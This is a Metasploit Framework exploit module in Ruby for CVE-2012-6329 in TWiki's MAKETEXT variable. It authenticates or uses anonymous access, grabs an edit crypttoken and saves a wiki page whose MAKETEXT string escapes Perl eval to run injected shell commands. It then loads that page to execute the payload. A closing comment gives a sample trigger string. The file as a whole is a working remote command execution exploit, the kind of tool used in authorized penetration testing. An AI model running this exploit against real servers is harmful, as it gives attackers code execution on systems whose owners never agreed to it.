# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;TWiki MAKETEXT Remote Command Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability in the MAKETEXT Twiki variable. By using a
                specially crafted MAKETEXT, a malicious user can execute shell commands since user
                input is passed to the Perl "eval" command without first being sanitized. The
                problem is caused by an underlying security issue in the CPAN:Locale::Maketext
                module. This works in TWiki sites that have user interface localization enabled
                (UserInterfaceInternationalisation variable set).
 
                If USERNAME and PASSWORD aren&#039;t provided, anonymous access will be tried. Also,
                if the &#039;TwikiPage&#039; option isn&#039;t provided, the module will try to create a random
                page on the SandBox space.  The modules has been tested successfully on
                TWiki 5.1.2 as distributed with the official TWiki-VM-5.1.2-1 virtual machine.
            },
            &#039;Author&#039;         =>
                [
                    &#039;George Clark&#039;, # original discovery
                    &#039;juan vazquez&#039; # Metasploit module
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2012-6329&#039; ],
                    [ &#039;OSVDB&#039;, &#039;88460&#039; ],
                    [ &#039;BID&#039;, &#039;56950&#039; ],
                    [ &#039;URL&#039;, &#039;http://twiki.org/cgi-bin/view/Codev/SecurityAlert-CVE-2012-6329&#039; ]
                ],
            &#039;Privileged&#039;     => false, # web server context
            &#039;Payload&#039;        =>
                {
                    &#039;DisableNops&#039; => true,
                    &#039;Space&#039;       => 1024,
                    &#039;Compat&#039;      =>
                        {
                            &#039;PayloadType&#039; => &#039;cmd&#039;,
                            &#039;RequiredCmd&#039; => &#039;generic ruby python bash telnet&#039;
                        }
                },
            &#039;Platform&#039;       => [ &#039;unix&#039; ],
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
            &#039;DisclosureDate&#039; => &#039;Dec 15 2012&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;TARGETURI&#039;, [ true, "TWiki base path", "/" ]),
                OptString.new(&#039;TwikiPage&#039;, [ false, "TWiki Page with edit permissions to inject the payload, by default random Page on Sandbox (Ex: /Sandbox/MsfTest)" ]),
                OptString.new(&#039;USERNAME&#039;, [ false,  "The user to authenticate as (anonymous if username not provided)"]),
                OptString.new(&#039;PASSWORD&#039;, [ false,  "The password to authenticate with (anonymous if password not provided)" ])
            ], self.class)
    end
 
    def do_login(username, password)
        res = send_request_cgi({
            &#039;method&#039;   => &#039;POST&#039;,
            &#039;uri&#039;      => "#{@base}do/login",
            &#039;vars_post&#039; =>
                {
                    &#039;username&#039; => username,
                    &#039;password&#039; => password
                }
            })
 
        if not res or res.code != 302 or res.headers[&#039;Set-Cookie&#039;] !~ /TWIKISID=([0-9a-f]*)/
            return nil
        end
 
        session = $1
        return session
    end
 
    def inject_code(session, code)
 
        vprint_status("Retrieving the crypttoken...")
 
        res = send_request_cgi({
            &#039;uri&#039;      => "#{@base}do/edit#{@page}",
            &#039;cookie&#039;   => "TWIKISID=#{session}",
            &#039;vars_get&#039; =>
                {
                    &#039;nowysiwyg&#039; => &#039;1&#039;
                }
        })
 
        if not res or res.code != 200 or res.body !~ /name="crypttoken" value="([0-9a-f]*)"/
            vprint_error("Error retrieving the crypttoken")
            return nil
        end
 
        crypttoken = $1
        vprint_good("crypttoken found: #{crypttoken}")
 
        if session.empty?
            if res.headers[&#039;Set-Cookie&#039;] =~ /TWIKISID=([0-9a-f]*)/
                session = $1
            else
                vprint_error("Error using anonymous access")
                return nil
            end
        end
 
        vprint_status("Injecting the payload...")
 
        res = send_request_cgi({
            &#039;method&#039;   => &#039;POST&#039;,
            &#039;uri&#039;      => "#{@base}do/save#{@page}",
            &#039;cookie&#039;   => "TWIKISID=#{session}",
            &#039;vars_post&#039; =>
            {
                &#039;crypttoken&#039; => crypttoken,
                &#039;text&#039; => "#{rand_text_alpha(3 + rand(3))} %MAKETEXT{\"#{rand_text_alpha(3 + rand(3))} [_1] #{rand_text_alpha(3 + rand(3))}\\\\&#039;}; `#{code}`; { #\" args=\"#{rand_text_alpha(3 + rand(3))}\"}%"
            }
        })
 
        if not res or res.code != 302 or res.headers[&#039;Location&#039;] =~ /oops/ or res.headers[&#039;Location&#039;] !~ /#{@page}/
            print_warning("Error injecting the payload")
            print_status "#{res.code}\n#{res.body}\n#{res.headers[&#039;Location&#039;]}"
            return nil
        end
 
        location = URI(res.headers[&#039;Location&#039;]).path
        print_good("Payload injected on #{location}")
 
        return location
    end
 
    def check
        @base = target_uri.path
        @base << &#039;/&#039; if @base[-1, 1] != &#039;/&#039;
 
        res = send_request_cgi({
            &#039;uri&#039;      => "#{@base}do/view/TWiki/WebHome"
        })
 
        if not res or res.code != 200
            return Exploit::CheckCode::Unknown
        end
 
        if res.body =~ /This site is running TWiki version.*TWiki-(\d\.\d\.\d)/
            version = $1
            print_status("Version found: #{version}")
            if version < "5.1.3"
                return Exploit::CheckCode::Appears
            else
                return Exploit::CheckCode::Safe
            end
        end
 
        return Exploit::CheckCode::Detected
    end
 
 
    def exploit
 
        # Init variables
        @page = &#039;&#039;
 
        if datastore[&#039;TwikiPage&#039;] and not datastore[&#039;TwikiPage&#039;].empty?
            @page << &#039;/&#039; if datastore[&#039;TwikiPage&#039;][0] != &#039;/&#039;
            @page << datastore[&#039;TwikiPage&#039;]
        else
            @page << "/Sandbox/#{rand_text_alpha_lower(3).capitalize}#{rand_text_alpha_lower(3).capitalize}"
        end
 
        @base = target_uri.path
        @base << &#039;/&#039; if @base[-1, 1] != &#039;/&#039;
 
        # Login if needed
        if (datastore[&#039;USERNAME&#039;] and
            not datastore[&#039;USERNAME&#039;].empty? and
            datastore[&#039;PASSWORD&#039;] and
            not datastore[&#039;PASSWORD&#039;].empty?)
            print_status("Trying login to get session ID...")
            session = do_login(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])
        else
            print_status("Using anonymous access...")
            session = ""
        end
 
        if not session
            fail_with(Exploit::Failure::Unknown, "Error getting a session ID")
        end
 
        # Inject payload
        print_status("Trying to inject the payload on #{@page}...")
        res = inject_code(session, payload.encoded)
        if not res
            fail_with(Exploit::Failure::Unknown, "Error injecting the payload")
        end
 
        # Execute payload
        print_status("Executing the payload through #{res}...")
        res = send_request_cgi({
            &#039;uri&#039;      => res,
            &#039;cookie&#039;   => "TWIKISID=#{session}"
        })
        if not res or res.code != 200 or res.body !~ /HASH/
            fail_with(Exploit::Failure::Unknown, "Error executing the payload")
        end
 
        print_good("Exploitation was successful")
 
    end
 
end
 
=begin
 
* Trigger:
 
%MAKETEXT{"test [_1] secondtest\\&#039;}; `touch /tmp/msf.txt`; { #" args="msf"}%
 
=end

